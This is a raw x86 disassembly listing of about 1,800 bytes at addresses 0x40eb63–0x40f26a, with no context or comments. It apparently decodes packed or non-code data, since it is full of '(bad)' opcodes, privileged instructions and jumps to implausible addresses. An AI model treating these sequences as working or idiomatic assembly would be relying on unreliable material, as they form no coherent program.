  40eb63:	addr16 inc esi
  40eb65:	jp     0x40eb7e
  40eb67:	stos   BYTE PTR es:[edi],al
  40eb68:	or     BYTE PTR [eax-0x7b],al
  40eb6b:	mov    dh,0x1
  40eb6d:	sub    ebx,esp
  40eb6f:	jecxz  0x40ebab
  40eb71:	in     eax,0xed
  40eb73:	loopne 0x40ebc1
  40eb75:	pop    ds
  40eb76:	fisubr DWORD PTR [ebx]
  40eb78:	add    ch,BYTE PTR [esi]
  40eb7a:	sbb    DWORD PTR [ecx+0x787d540],ecx
  40eb80:	sbb    edi,DWORD PTR [ecx+0x49]
  40eb83:	dec    edi
  40eb84:	imul   eax,DWORD PTR [edi-0xb7da0cf],0x19f5d0d0
  40eb8e:	add    eax,DWORD PTR [edx+edi*8-0x520db474]
  40eb95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb96:	xchg   edi,eax
  40eb97:	jmp    FWORD PTR [ebp+0x0]
  40eb9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb9b:	out    dx,al
  40eb9c:	add    eax,0x6f18f0a5
  40eba1:	out    dx,al
  40eba2:	xor    al,0xa7
  40eba4:	retf   0xfc1a
  40eba7:	xor    al,0xce
  40eba9:	pop    ecx
  40ebaa:	cdq    
  40ebab:	stc    
  40ebac:	push   edx
  40ebad:	lahf   
  40ebae:	das    
  40ebaf:	lods   eax,DWORD PTR ds:[esi]
  40ebb0:	or     al,0x16
  40ebb2:	lods   eax,DWORD PTR ds:[esi]
  40ebb3:	call   0xe86b7e72
  40ebb8:	stc    
  40ebb9:	repz jecxz 0x40ec31
  40ebbc:	and    DWORD PTR [ecx+0x1],0x42ecf12f
  40ebc3:	bound  ebx,QWORD PTR [ecx+0x2726d8a]
  40ebc9:	mov    ?,WORD PTR [ecx]
  40ebcb:	add    ebx,ebp
  40ebcd:	daa    
  40ebce:	pushf  
  40ebcf:	mov    bl,0xc6
  40ebd1:	sub    DWORD PTR [edi+0x434685c7],0xfffffffa
  40ebd8:	jb     0x40ec30
  40ebda:	pop    eax
  40ebdb:	inc    esp
  40ebdc:	dec    ebx
  40ebdd:	add    DWORD PTR [edx],edi
  40ebdf:	outs   dx,BYTE PTR ds:[esi]
  40ebe0:	daa    
  40ebe1:	aam    0xe8
  40ebe3:	pop    es
  40ebe4:	pop    ecx
  40ebe5:	jnp    0x40ebd0
  40ebe7:	into   
  40ebe8:	pop    ds
  40ebe9:	jb     0x40ebd1
  40ebeb:	retf   0xe455
  40ebee:	lea    edx,[ebx]
  40ebf0:	imul   ebp,DWORD PTR [ecx-0x5eac17fb],0xac23d675
  40ebfa:	dec    esi
  40ebfb:	loopne 0x40ebce
  40ebfd:	aas    
  40ebfe:	lea    esp,[esi-0x2e]
  40ec01:	dec    esi
  40ec02:	xlat   BYTE PTR ds:[ebx]
  40ec04:	sub    BYTE PTR [edi-0x41858646],0x60
  40ec0b:	aam    0x59
  40ec0d:	push   DWORD PTR [ebx+0x9]
  40ec10:	lea    ebx,[ebx+ebp*4-0x49c48bb8]
  40ec17:	and    edx,DWORD PTR [esp+eiz*2+0x6051c14a]
  40ec1e:	in     al,dx
  40ec1f:	dec    BYTE PTR [ecx+0xf]
  40ec22:	(bad)  
  40ec23:	xchg   edx,eax
  40ec24:	add    DWORD PTR [ebx+0x34],0x13fbda04
  40ec2b:	sub    al,0xe3
  40ec2d:	jns    0x40ebf5
  40ec2f:	or     dl,BYTE PTR [ecx+0x62d30ba]
  40ec35:	adc    eax,0xe72912f9
  40ec3a:	mov    ch,0x7
  40ec3c:	mov    dl,0x5f
  40ec3e:	stos   BYTE PTR es:[edi],al
  40ec3f:	stos   BYTE PTR es:[edi],al
  40ec40:	aas    
  40ec41:	cmc    
  40ec42:	or     al,0x6b
  40ec44:	fpatan 
  40ec46:	mov    edi,0x25718c59
  40ec4b:	push   ebx
  40ec4c:	sbb    al,BYTE PTR [edi-0x3f]
  40ec4f:	jo     0x40ecad
  40ec51:	sbb    al,0x6
  40ec53:	jno    0x40ec76
  40ec55:	jb     0x40ec30
  40ec57:	fsin   
  40ec59:	dec    BYTE PTR [edx]
  40ec5b:	pop    ebx
  40ec5c:	imul   esi,DWORD PTR [ecx-0x13],0xb2f040bb
  40ec63:	jb     0x40ec3a
  40ec65:	inc    edi
  40ec66:	out    0x9b,eax
  40ec68:	jb     0x40ec98
  40ec6a:	add    eax,0x25e7ada7
  40ec6f:	xchg   DWORD PTR [esi+0x250fc6f8],ebx
  40ec75:	call   0x602ea7cf
  40ec7a:	hlt    
  40ec7b:	inc    eax
  40ec7c:	xchg   DWORD PTR [ebp+eiz*8+0x7f],esi
  40ec80:	push   0xffffffa2
  40ec82:	xor    eax,0x446ee9b7
  40ec87:	lea    ebp,[ecx]
  40ec89:	and    esi,DWORD PTR [eax]
  40ec8b:	outs   dx,BYTE PTR ds:[esi]
  40ec8c:	mov    ds:0x3f2082fd,eax
  40ec91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec92:	(bad)  
  40ec93:	es mov ecx,fs
  40ec96:	and    eax,0xd3abc61b
  40ec9b:	pusha  
  40ec9c:	fbstp  TBYTE PTR [esi-0x38]
  40ec9f:	push   ebx
  40eca0:	push   eax
  40eca1:	pop    esi
  40eca2:	leave  
  40eca3:	sahf   
  40eca4:	mov    ss,WORD PTR [ecx]
  40eca6:	jle    0x40ec49
  40eca8:	sahf   
  40eca9:	mov    ebx,0x1fd46f49
  40ecae:	xor    esp,DWORD PTR [esi-0x26]
  40ecb1:	push   edx
  40ecb2:	int3   
  40ecb3:	das    
  40ecb4:	cli    
  40ecb5:	or     ecx,DWORD PTR ds:[esi+0x20457fff]
  40ecbc:	fistp  QWORD PTR [edx-0x11]
  40ecbf:	jno    0x40ecc6
  40ecc1:	xchg   esp,eax
  40ecc2:	scas   al,BYTE PTR es:[edi]
  40ecc3:	pop    edx
  40ecc4:	adc    DWORD PTR [ecx],0x4f
  40ecc7:	and    al,0xd
  40ecc9:	xchg   edx,eax
  40ecca:	cmc    
  40eccb:	xor    eax,0x76f0ce98
  40ecd0:	ss iret 
  40ecd2:	into   
  40ecd3:	sbb    edx,esi
  40ecd5:	repz xchg esi,eax
  40ecd7:	xchg   edi,eax
  40ecd8:	sub    ah,BYTE PTR [ebp-0x42856c27]
  40ecde:	jo     0x40ecd9
  40ece0:	das    
  40ece1:	test   BYTE PTR [ebx+0x6],bl
  40ece4:	mov    eax,0xd5b1d297
  40ece9:	mov    eax,0xf1a98f44
  40ecee:	loopne 0x40ed5f
  40ecf0:	fild   WORD PTR [edi]
  40ecf2:	dec    eax
  40ecf3:	sbb    DWORD PTR [edi-0x73],ebp
  40ecf6:	rcr    BYTE PTR [edx-0x55213365],0x38
  40ecfd:	jmp    0x40ed09
  40ecff:	loop   0x40ed5f
  40ed01:	mov    ebx,0xb5716289
  40ed06:	repz pop ebp
  40ed08:	xchg   esp,eax
  40ed09:	and    bh,BYTE PTR [esi]
  40ed0b:	jp     0x40eccc
  40ed0d:	out    0xbf,al
  40ed0f:	mov    BYTE PTR [esi+0x6d],bh
  40ed12:	push   esp
  40ed13:	adc    edx,esp
  40ed15:	fst    DWORD PTR [eax+0x3]
  40ed18:	adc    al,0x6c
  40ed1a:	pop    esi
  40ed1b:	add    ch,BYTE PTR [eax]
  40ed1d:	aam    0x70
  40ed1f:	sbb    BYTE PTR [edx-0x30],ch
  40ed22:	or     eax,0xde9171e2
  40ed27:	push   ecx
  40ed28:	js     0x40ecdc
  40ed2a:	aas    
  40ed2b:	into   
  40ed2c:	in     eax,dx
  40ed2d:	cmp    esp,eax
  40ed2f:	pop    es
  40ed30:	or     eax,esi
  40ed32:	pop    ebp
  40ed33:	nop
  40ed34:	add    DWORD PTR [edx+0x52],edx
  40ed37:	pop    ds
  40ed38:	jge    0x40ed0d
  40ed3a:	xor    BYTE PTR ds:0xf3281d32,dl
  40ed40:	icebp  
  40ed41:	in     al,dx
  40ed42:	aad    0x3b
  40ed44:	mul    BYTE PTR [ebp+0x20]
  40ed47:	(bad)  
  40ed48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed49:	mov    al,0xe4
  40ed4b:	push   ebx
  40ed4c:	retf   0xb402
  40ed4f:	jle    0x40ecd8
  40ed51:	into   
  40ed52:	lahf   
  40ed53:	test   al,0xef
  40ed55:	test   eax,0x2106d060
  40ed5a:	imul   esp,eax,0xffffff84
  40ed5d:	cmp    dh,BYTE PTR [ebx-0x33]
  40ed60:	popf   
  40ed61:	stos   BYTE PTR es:[edi],al
  40ed62:	cmp    DWORD PTR [ebx+0x201393db],eax
  40ed68:	lahf   
  40ed69:	jmp    DWORD PTR [ebp-0x1b]
  40ed6c:	into   
  40ed6d:	add    al,0x73
  40ed6f:	mov    ds:0x88411c52,al
  40ed74:	or     eax,DWORD PTR [edi]
  40ed76:	mov    ds:0xdbb2e6fc,al
  40ed7b:	push   eax
  40ed7c:	xor    al,0xf3
  40ed7e:	mov    ebx,0x6ca9bd2b
  40ed83:	call   0x9a1e2f93
  40ed88:	xchg   DWORD PTR [ebx],esp
  40ed8a:	enter  0xb764,0x5b
  40ed8e:	mov    esi,0x9a27e970
  40ed93:	mov    DWORD PTR [eax-0x5ae3c9b2],esi
  40ed99:	push   ecx
  40ed9a:	cmp    BYTE PTR [esi-0x69f8ea9a],ch
  40eda0:	enter  0xa00e,0x93
  40eda4:	mov    BYTE PTR [ebx+0x1e],ah
  40eda7:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eda9:	stos   BYTE PTR es:[edi],al
  40edaa:	add    DWORD PTR [ebx],ebp
  40edac:	lods   al,BYTE PTR ds:[esi]
  40edad:	das    
  40edae:	sub    al,0xfd
  40edb0:	inc    ebx
  40edb1:	mov    BYTE PTR [ecx-0x62],bl
  40edb4:	mul    DWORD PTR [esi-0x24]
  40edb7:	and    bl,BYTE PTR [edx+0x45]
  40edba:	fidiv  WORD PTR [ebx+0x6f]
  40edbd:	mov    edi,0x6aab35e1
  40edc2:	pop    ecx
  40edc3:	dec    edx
  40edc4:	jne    0x40ed47
  40edc6:	push   eax
  40edc7:	lods   eax,DWORD PTR ds:[esi]
  40edc8:	enter  0xe33e,0x66
  40edcc:	dec    esi
  40edcd:	xor    al,0x3d
  40edcf:	sbb    eax,0xa9bf1d4c
  40edd4:	pop    ss
  40edd5:	mov    al,0x7c
  40edd7:	mov    esi,0x5d3c4c1c
  40eddc:	fiadd  WORD PTR [eax+eax*4]
  40eddf:	push   cs
  40ede0:	inc    eax
  40ede1:	add    al,0x3a
  40ede3:	mov    eax,0x6a13a56a
  40ede8:	pop    ebp
  40ede9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edea:	and    edx,DWORD PTR [ecx-0x5e3935f6]
  40edf0:	imul   BYTE PTR [ecx+edx*1]
  40edf3:	idiv   BYTE PTR [edi-0x74]
  40edf6:	popf   
  40edf7:	fsubr  QWORD PTR [ebp+0x2517f14b]
  40edfd:	enter  0xc684,0x19
  40ee01:	ret    0xfcc5
  40ee04:	popf   
  40ee05:	push   ss
  40ee06:	lods   eax,DWORD PTR ds:[esi]
  40ee07:	in     al,dx
  40ee08:	sub    DWORD PTR [ecx-0x13],esp
  40ee0b:	add    eax,0x82ad837
  40ee10:	cmp    edi,esp
  40ee12:	int3   
  40ee13:	xchg   esi,eax
  40ee14:	push   ecx
  40ee15:	jo     0x40eda1
  40ee17:	add    eax,0xb13492d4
  40ee1c:	add    ebp,DWORD PTR [edi+eax*2]
  40ee1f:	push   ds
  40ee20:	xor    eax,0xf9ee8bc0
  40ee25:	jbe    0x40ede1
  40ee27:	retf   0xd4e5
  40ee2a:	and    BYTE PTR [ebx-0x56],0x2d
  40ee2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee30:	mov    edi,eax
  40ee32:	adc    esi,DWORD PTR [esi+edi*2-0x50]
  40ee36:	in     al,dx
  40ee37:	push   ss
  40ee38:	fidiv  DWORD PTR [ebp-0x17]
  40ee3b:	lock stos DWORD PTR es:[edi],eax
  40ee3d:	lods   al,BYTE PTR ds:[esi]
  40ee3e:	or     al,BYTE PTR [ebx+esi*2]
  40ee41:	iret   
  40ee42:	pop    edx
  40ee43:	cmp    DWORD PTR [eax+0x7c3004eb],ebx
  40ee49:	loope  0x40eec0
  40ee4b:	inc    eax
  40ee4c:	(bad)  
  40ee4d:	sahf   
  40ee4e:	int    0x24
  40ee50:	and    DWORD PTR [esi*2+0x30726f9e],edi
  40ee57:	cmp    BYTE PTR [edi-0x4ead7e17],dh
  40ee5d:	cmp    ebx,DWORD PTR cs:[esi]
  40ee60:	dec    edx
  40ee61:	fcmovne st,st(4)
  40ee63:	push   0xfffffff0
  40ee65:	cld    
  40ee66:	popa   
  40ee67:	dec    esp
  40ee68:	ja     0x40edea
  40ee6a:	ins    BYTE PTR es:[edi],dx
  40ee6b:	or     eax,0x89ebd1af
  40ee70:	fiadd  DWORD PTR [eax-0x2d]
  40ee73:	or     ebp,DWORD PTR [ecx+eiz*4-0x7bc09ce]
  40ee7a:	jp     0x40eead
  40ee7c:	push   0x7db6a7a7
  40ee81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee82:	dec    edi
  40ee83:	lods   al,BYTE PTR ds:[esi]
  40ee84:	mov    al,dl
  40ee86:	dec    ebx
  40ee87:	xchg   edi,eax
  40ee88:	ret    0x4a7c
  40ee8b:	inc    eax
  40ee8c:	mov    ebx,0xd4518e8a
  40ee91:	inc    ebp
  40ee92:	sub    DWORD PTR cs:[ebx+0x2d3a1ddb],ebx
  40ee99:	jg     0x40eef5
  40ee9b:	int    0x21
  40ee9d:	and    cl,bh
  40ee9f:	stos   BYTE PTR es:[edi],al
  40eea0:	repnz xor DWORD PTR [edi],ecx
  40eea3:	lods   al,BYTE PTR ds:[esi]
  40eea4:	mov    ebp,0x6ac08319
  40eea9:	xchg   ebx,eax
  40eeaa:	xor    BYTE PTR [edx+0x2f],cl
  40eead:	cmc    
  40eeae:	lock sar BYTE PTR [edi+0x22535223],0xeb
  40eeb6:	mov    bl,0x94
  40eeb8:	test   al,0xb0
  40eeba:	outs   dx,BYTE PTR ds:[esi]
  40eebb:	sub    al,0x6f
  40eebd:	stos   BYTE PTR es:[edi],al
  40eebe:	push   edi
  40eebf:	hlt    
  40eec0:	sub    al,0xe8
  40eec2:	sub    BYTE PTR [ecx+0x29cfce97],al
  40eec8:	inc    edi
  40eec9:	ins    DWORD PTR es:[edi],dx
  40eeca:	jmp    0x40eec4
  40eecc:	fsub   DWORD PTR [ebp+0x16]
  40eecf:	mov    ds:0x892c8e39,eax
  40eed4:	dec    ebx
  40eed5:	push   ebp
  40eed6:	or     edi,DWORD PTR [ebx+esi*8+0x7e854a6c]
  40eedd:	xchg   edi,eax
  40eede:	arpl   WORD PTR [eax-0x66dbbd35],bx
  40eee4:	adc    al,0xd
  40eee6:	fdiv   QWORD PTR [esi+0x45faf93f]
  40eeec:	lock mov cl,0x9
  40eeef:	mov    ebp,0xe1c8c416
  40eef4:	icebp  
  40eef5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eef6:	lahf   
  40eef7:	jo     0x40eef0
  40eef9:	iret   
  40eefa:	xor    eax,0x1b16450b
  40eeff:	xor    eax,0x10045374
  40ef04:	adc    BYTE PTR ds:0xb7bf0821,ch
  40ef0a:	adc    cl,ch
  40ef0c:	add    BYTE PTR [ecx-0x5d],bh
  40ef0f:	inc    esi
  40ef10:	sbb    BYTE PTR [eax-0x52],cl
  40ef13:	xchg   ebx,eax
  40ef14:	fadd   DWORD PTR [ecx+0x24]
  40ef17:	jecxz  0x40ef47
  40ef19:	retf   
  40ef1a:	lods   eax,DWORD PTR ds:[esi]
  40ef1b:	inc    edi
  40ef1c:	(bad)  
  40ef1d:	stos   BYTE PTR es:[edi],al
  40ef1e:	ja     0x40eeb5
  40ef20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef21:	mov    dl,0xfa
  40ef23:	sbb    al,0xe1
  40ef25:	xchg   ebx,eax
  40ef26:	in     al,0xe1
  40ef28:	popf   
  40ef29:	mov    ch,0xf
  40ef2b:	js     0x40ef23
  40ef2d:	fs call 0x47a9:0xe9df450d
  40ef35:	inc    edi
  40ef36:	mov    ch,0x6a
  40ef38:	pusha  
  40ef39:	mov    DWORD PTR [eax+0x156d3491],ecx
  40ef3f:	sbb    eax,0x49b4c240
  40ef44:	jnp    0x40efa9
  40ef46:	add    eax,0x2e9979d9
  40ef4b:	stos   DWORD PTR es:[edi],eax
  40ef4c:	xor    eax,0xf40298d3
  40ef51:	rol    BYTE PTR [ebp+0x7b81e82f],cl
  40ef57:	scas   eax,DWORD PTR es:[edi]
  40ef58:	fst    st(6)
  40ef5a:	adc    al,0x72
  40ef5c:	and    edi,eax
  40ef5e:	sbb    BYTE PTR [esi+0x34],bh
  40ef61:	cmp    ch,al
  40ef63:	inc    DWORD PTR [esi]
  40ef65:	sbb    al,0x72
  40ef67:	xor    al,0x7
  40ef69:	(bad)  
  40ef6b:	jo     0x40ef1b
  40ef6d:	repnz fs pop esi
  40ef70:	and    BYTE PTR [eax-0x6455807d],ah
  40ef76:	or     dh,cl
  40ef78:	icebp  
  40ef79:	fsubr  st(0),st
  40ef7b:	sahf   
  40ef7c:	mov    ds:0x981c0285,eax
  40ef81:	xchg   edi,eax
  40ef82:	jp     0x40f003
  40ef84:	test   al,0x80
  40ef86:	push   edx
  40ef87:	and    al,0xd3
  40ef89:	cmp    ah,BYTE PTR [ebp-0x70]
  40ef8c:	jo     0x40efd0
  40ef8e:	in     eax,dx
  40ef8f:	pop    ebx
  40ef90:	sqrtps xmm5,xmm5
  40ef93:	mov    BYTE PTR [esi],ah
  40ef95:	cmp    al,0x16
  40ef97:	sbb    DWORD PTR [esi+ebx*4-0x75791a9d],esi
  40ef9e:	mov    cl,0x75
  40efa0:	push   ebp
  40efa1:	hlt    
  40efa2:	push   eax
  40efa3:	dec    edx
  40efa4:	dec    edx
  40efa5:	cld    
  40efa6:	repnz mov edx,0xa2c91e0c
  40efac:	adc    DWORD PTR es:[ebx-0x5254f587],esi
  40efb3:	jle    0x40ef4b
  40efb5:	cdq    
  40efb6:	sub    ax,WORD PTR [ebx]
  40efb9:	sub    bh,BYTE PTR [esi+edx*8]
  40efbc:	and    DWORD PTR [edx+0x5d],0x1f
  40efc0:	dec    esi
  40efc1:	lods   al,BYTE PTR ds:[esi]
  40efc2:	cli    
  40efc3:	call   0x2fa9960b
  40efc8:	jle    0x40ef8f
  40efca:	cmp    ch,BYTE PTR [eax]
  40efcc:	xchg   ebx,eax
  40efcd:	pop    edx
  40efce:	mov    ah,0xd4
  40efd0:	jge    0x40efd4
  40efd2:	cld    
  40efd3:	loop   0x40ef66
  40efd5:	loopne 0x40efb5
  40efd7:	jle    0x40f031
  40efd9:	xchg   ebx,eax
  40efda:	xor    bh,0xe6
  40efdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efde:	jge    0x40efe0
  40efe0:	enter  0x16bd,0x2f
  40efe4:	mov    DWORD PTR [ecx+0x43],ecx
  40efe7:	dec    edi
  40efe8:	push   ss
  40efe9:	mov    ah,0xec
  40efeb:	aas    
  40efec:	imul   ebp,DWORD PTR [ebp+0x340aeeaf],0x170976c0
  40eff6:	jmp    0x154c3edf
  40effb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40effc:	jmp    0x9b57:0x8406dc37
  40f003:	rcl    al,cl
  40f005:	push   ecx
  40f006:	sbb    BYTE PTR [ecx+0x49],dh
  40f009:	mov    ah,0x12
  40f00b:	pop    esi
  40f00c:	sub    al,0xec
  40f00e:	pop    ecx
  40f00f:	mov    cl,0x63
  40f011:	test   BYTE PTR [esi],ch
  40f013:	mov    eax,ds:0xea8b9c46
  40f018:	idiv   edx
  40f01a:	clc    
  40f01b:	int    0x5d
  40f01d:	bound  edi,QWORD PTR [ecx+0x12cbcfef]
  40f023:	inc    eax
  40f024:	loopne 0x40f086
  40f026:	scas   al,BYTE PTR es:[edi]
  40f027:	in     eax,dx
  40f028:	and    BYTE PTR [ecx+0x71],ch
  40f02b:	push   ds
  40f02c:	test   BYTE PTR ds:0x9d34eb36,dh
  40f032:	jge    0x40efdc
  40f034:	sbb    bl,BYTE PTR [eax+0x2f34cdd5]
  40f03a:	jp     0x40f074
  40f03c:	cli    
  40f03d:	pop    ebp
  40f03e:	ins    DWORD PTR es:[edi],dx
  40f03f:	call   0x6f0c08c0
  40f044:	in     al,dx
  40f045:	push   edx
  40f046:	jp     0x40f041
  40f048:	xor    DWORD PTR [edx-0x5c],0xffffffda
  40f04c:	in     al,0x54
  40f04e:	xor    bl,BYTE PTR [ebx+ecx*2]
  40f051:	dec    ecx
  40f052:	bound  ebp,QWORD PTR [edx+0x50]
  40f055:	fisttp DWORD PTR [edx]
  40f057:	adc    BYTE PTR [edx+edx*8-0x28ea5175],dl
  40f05e:	(bad)  
  40f060:	fstp   QWORD PTR [eax-0x5a]
  40f063:	sbb    al,0x18
  40f065:	xchg   ebx,eax
  40f066:	cmp    DWORD PTR [edx+0x266d1178],esi
  40f06c:	(bad)
  40f06f:	stc    
  40f070:	fst    QWORD PTR [ecx+0x18b4f0d1]
  40f076:	idiv   DWORD PTR [ebx+0x1d]
  40f079:	stc    
  40f07a:	mov    eax,ds:0x426f7a2c
  40f07f:	mov    esi,0x5fb9db3f
  40f084:	pusha  
  40f085:	stos   BYTE PTR es:[edi],al
  40f086:	int    0xa3
  40f088:	jecxz  0x40f04e
  40f08a:	sar    BYTE PTR [esi+edx*1-0x1b],0x71
  40f08f:	in     al,dx
  40f090:	out    0x3c,al
  40f092:	or     DWORD PTR [edi+0x1f],edi
  40f095:	(bad)  
  40f096:	scas   eax,DWORD PTR es:[edi]
  40f097:	ficom  DWORD PTR [eax+0x460a18b7]
  40f09d:	push   ebx
  40f09e:	push   edx
  40f09f:	mov    eax,DWORD PTR [edi]
  40f0a1:	mov    bl,0x50
  40f0a3:	sub    esi,ebx
  40f0a5:	add    DWORD PTR [ecx+esi*4-0x28],eax
  40f0a9:	fisub  WORD PTR [ebp+0x21]
  40f0ac:	pop    eax
  40f0ad:	and    cl,ch
  40f0af:	and    BYTE PTR [ebx-0x7ef2b82f],ch
  40f0b5:	push   es
  40f0b6:	jle    0x40f0bd
  40f0b8:	pop    es
  40f0b9:	ins    DWORD PTR es:[edi],dx
  40f0ba:	push   ebx
  40f0bb:	js     0x40f063
  40f0bd:	pushf  
  40f0be:	call   0x768cdb48
  40f0c3:	sub    bl,BYTE PTR [esi]
  40f0c5:	jbe    0x40f086
  40f0c7:	inc    edx
  40f0c8:	(bad)  
  40f0c9:	jmp    0x3c8ce4fa
  40f0ce:	sub    eax,0x9e3d9976
  40f0d3:	test   al,0xb2
  40f0d5:	out    0xe,eax
  40f0d7:	ret    
  40f0d8:	adc    eax,0xe0a7b9b6
  40f0dd:	test   al,0xfc
  40f0df:	dec    ecx
  40f0e0:	(bad)  
  40f0e1:	sbb    ecx,esi
  40f0e3:	push   ss
  40f0e4:	push   ss
  40f0e5:	lahf   
  40f0e6:	addr16 data16 aad 0x35
  40f0ea:	in     eax,dx
  40f0eb:	cli    
  40f0ec:	push   esp
  40f0ed:	jo     0x40f0da
  40f0ef:	fs xor al,0x66
  40f0f2:	cwde   
  40f0f3:	test   eax,0x7422459c
  40f0f8:	inc    ebx
  40f0f9:	mov    dl,0x91
  40f0fb:	and    cl,BYTE PTR [edi-0x9]
  40f0fe:	cmp    eax,0x6135ede6
  40f103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f104:	imul   eax,DWORD PTR [ebx+ebp*4+0x220a89c0],0x68
  40f10c:	mov    edx,0x52612509
  40f111:	das    
  40f112:	orps   xmm4,XMMWORD PTR ds:[eax-0x1123d9e8]
  40f11a:	lds    esi,FWORD PTR [ebx-0x13]
  40f11d:	data16 fsubr DWORD PTR [esi]
  40f120:	lods   eax,DWORD PTR ds:[esi]
  40f121:	push   ecx
  40f122:	pop    edi
  40f123:	out    0xad,eax
  40f125:	retf   0x8246
  40f128:	inc    edi
  40f129:	mov    ecx,0xf5f80a32
  40f12e:	mov    edi,0xc202771c
  40f133:	or     ah,ah
  40f135:	push   0xffffffd7
  40f137:	cmc    
  40f138:	stos   BYTE PTR es:[edi],al
  40f139:	cmp    eax,DWORD PTR [ecx+0x3f]
  40f13c:	js     0x40f1b8
  40f13e:	bound  edx,QWORD PTR [eax+eax*2]
  40f141:	jmp    0x4f3c6838
  40f146:	das    
  40f147:	jne    0x40f15d
  40f149:	adc    BYTE PTR [edi-0x77bd05a3],cl
  40f14f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f150:	cs std 
  40f152:	int    0xcd
  40f154:	fdivp  st(1),st
  40f156:	xchg   esp,eax
  40f157:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f158:	fiadd  DWORD PTR ds:0x88d6288e
  40f15e:	scas   eax,DWORD PTR es:[edi]
  40f15f:	dec    esp
  40f160:	ds push esp
  40f162:	mov    gs,WORD PTR [eax]
  40f164:	jnp    0x40f0f0
  40f166:	ins    DWORD PTR es:[edi],dx
  40f167:	fcomi  st,st(1)
  40f169:	retf   0x25bf
  40f16c:	mov    dl,0x45
  40f16e:	js     0x40f198
  40f170:	ins    BYTE PTR es:[edi],dx
  40f171:	out    dx,eax
  40f172:	cmp    eax,0xc7bf63dc
  40f177:	jl     0x40f1a6
  40f179:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f17a:	add    DWORD PTR [ebp+0x81a78a5],esi
  40f180:	mov    esi,0xe8b8e7fc
  40f185:	cmp    esp,DWORD PTR [eax+0x757e24cf]
  40f18b:	mov    gs,WORD PTR [ebx-0x1e]
  40f18e:	xchg   edi,eax
  40f18f:	and    al,BYTE PTR [edx-0x2017942d]
  40f195:	xchg   edx,eax
  40f196:	aaa    
  40f197:	sbb    BYTE PTR [ebp+0x70],ch
  40f19a:	iret   
  40f19b:	retf   0xe01b
  40f19e:	inc    ebp
  40f19f:	in     al,dx
  40f1a0:	ss jae 0x40f144
  40f1a3:	add    al,0x59
  40f1a5:	and    ah,0xc7
  40f1a8:	add    edi,ebp
  40f1aa:	clc    
  40f1ab:	xchg   ebp,eax
  40f1ac:	repz cmp eax,0xe3f75481
  40f1b2:	leave  
  40f1b3:	aam    0xb9
  40f1b5:	aam    0xee
  40f1b7:	sbb    al,0x5
  40f1b9:	(bad)  
  40f1ba:	in     eax,0xe9
  40f1bc:	iret   
  40f1bd:	pop    ss
  40f1be:	jge    0x40f141
  40f1c0:	ins    BYTE PTR es:[edi],dx
  40f1c1:	shl    BYTE PTR [edi],1
  40f1c3:	dec    esp
  40f1c4:	sti    
  40f1c5:	mov    esp,esi
  40f1c7:	xadd   eax,edx
  40f1ca:	(bad)  
  40f1cb:	sub    DWORD PTR [edx+ebx*8-0x35],edi
  40f1cf:	mov    al,ds:0x307dd548
  40f1d4:	pop    ebp
  40f1d5:	std    
  40f1d6:	mov    ch,0xcb
  40f1d8:	ins    BYTE PTR es:[edi],dx
  40f1d9:	and    edx,ebp
  40f1db:	in     al,dx
  40f1dc:	push   cs
  40f1dd:	adc    edi,ecx
  40f1df:	dec    esp
  40f1e0:	mov    eax,0x31c29934
  40f1e5:	cmp    ebp,DWORD PTR es:[edx-0x75]
  40f1e9:	lods   eax,DWORD PTR ds:[esi]
  40f1ea:	pop    esi
  40f1eb:	sub    al,0x17
  40f1ed:	cmp    BYTE PTR [ebx-0x532646a1],ah
  40f1f3:	mov    dl,0xc4
  40f1f5:	popa   
  40f1f6:	cli    
  40f1f7:	loope  0x40f252
  40f1f9:	bswap  eax
  40f1fb:	mov    DWORD PTR [esi+0x2142d91c],eax
  40f201:	nop
  40f202:	xchg   edi,eax
  40f203:	lods   al,BYTE PTR ds:[esi]
  40f204:	inc    edx
  40f205:	xor    BYTE PTR [esi-0x229f49f5],dh
  40f20b:	sbb    eax,0xb473b3cb
  40f210:	lock lea ecx,[eax+0x4677fb17]
  40f217:	xor    BYTE PTR [ecx-0x1e],bh
  40f21a:	mov    al,0x8b
  40f21c:	push   es
  40f21d:	int    0xd3
  40f21f:	fbstp  TBYTE PTR [esi+eax*2-0x4]
  40f223:	sub    ebx,eax
  40f225:	sbb    BYTE PTR [esi+ebp*2+0x54],ah
  40f229:	mov    eax,ds:0xedb25985
  40f22e:	cdq    
  40f22f:	mov    cl,0x57
  40f231:	mov    BYTE PTR [ecx-0x44],0xf
  40f235:	dec    eax
  40f236:	loop   0x40f25e
  40f238:	test   DWORD PTR [edx-0x5b21a592],ebp
  40f23e:	push   ebp
  40f23f:	les    esp,FWORD PTR [ebx]
  40f241:	nop
  40f242:	lahf   
  40f243:	inc    edi
  40f244:	lahf   
  40f245:	xor    BYTE PTR [eax+ecx*8+0x55],cl
  40f249:	jno    0x40f292
  40f24b:	jg     0x40f27d
  40f24d:	lods   al,BYTE PTR ds:[esi]
  40f24e:	mov    ebx,0xe9a53d6a
  40f253:	pop    ebp
  40f254:	mov    ds:0xb70e2ab1,eax
  40f259:	jae    0x40f273
  40f25b:	iret   
  40f25c:	mov    DWORD PTR [ebx+0x37],eax
  40f25f:	jns    0x40f26e
  40f261:	add    BYTE PTR [ecx+edi*2],dh
  40f264:	daa    
  40f265:	inc    ebp
  40f266:	iret   
  40f267:	dec    ebp
  40f268:	inc    ebx
  40f269:	scas   eax,DWORD PTR es:[edi]
  40f26a:	or     DWORD PTR [ecx-0x14],ebx
